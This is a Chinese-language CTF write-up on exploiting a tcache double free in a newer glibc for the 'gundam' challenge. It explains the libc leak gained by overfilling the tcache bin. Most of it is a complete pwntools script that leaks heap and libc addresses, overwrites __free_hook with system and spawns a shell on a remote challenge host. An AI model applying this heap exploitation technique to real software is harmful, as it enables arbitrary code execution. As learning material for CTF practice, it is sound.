这题说真的学到新东西了

因为这题是新版本的libc，我还特地去弄了一个新的虚拟机装新的libc

然后用常规的方法去打，发现怎么样都leak不出libc的地址，最多也只能leak出堆中的地址

后面发现堆开始的会分配一个大小为0x248的堆，然后free掉某个堆之后，地址就会出现在这里

然后free掉多个同样大小的堆之后，就会像fastbin一样用一个单向链表连接起来

但是试了一下，double free之后，居然能malloc到任意地址......这个真的有点....

有了任意内存写，但是还是找不到leak出libc的办法.....

后面团队里面一个dalao跟我说了这是tcache，然后有tcache的bin是有数量限制的，过了一定数量就会用原来的main arena

这样就可以leak出libc的地址

有了libc的地址，再加上任意内存读写，基本啥骚操作都能弄出来了

```
from pwn import *

debug=0
context.log_level='debug'
e=ELF('./libc.so')
if debug:
    p=process('gundam',env={'LD_PRELOAD':'./libc.so'})
    gdb.attach(p)
else:
    p=remote('47.75.37.114', 9999)

def ru(x):
    return p.recvuntil(x)

def se(x):
    p.send(x)

def build(name,tp):
    se('1\n')
    ru('The name of gundam :')
    se(name)
    ru('The type of the gundam :')
    se(str(tp)+'\n')
    ru('choice : ')

def visit():
    se('2\n')
    data=ru('1 . ')
    ru('choice : ')
    return data

def destory(idx,wait=True):
    se('3\n')
    ru('Which gundam do you want to Destory:')
    se(str(idx)+'\n')
    if wait:
        ru('choice : ')

def blow_up():
    se('4\n')
    ru('choice : ')


for i in range(9):
    build('a',1)
for i in range(8):
    destory(i)
blow_up()
build('a',1)

for i in range(3):
    build('a',1)

data=visit()
t1=data.index("[0] :")+5
heap=u64(data[t1:t1+6]+'\x00\x00')-0x861

heap_libc=heap+0xb50

destory(0)
destory(0)  #double free

build(p64(heap_libc),1)
build('a',1)
build('a',1)


data=visit()
t2=data.index("[6] :")+5
libc=u64(data[t2:t2+6]+'\x00\x00')

base=libc-0x3DAC61

free_hook=base+e.symbols['__free_hook']
system=base+e.symbols['system']

print(hex(heap))
print(hex(base))

destory(2)
blow_up()

destory(1)
destory(1)



build(p64(free_hook),1)
build('/bin/sh',1)
build(p64(system),1)

destory(0,False)
print(hex(free_hook))

p.interactive()


```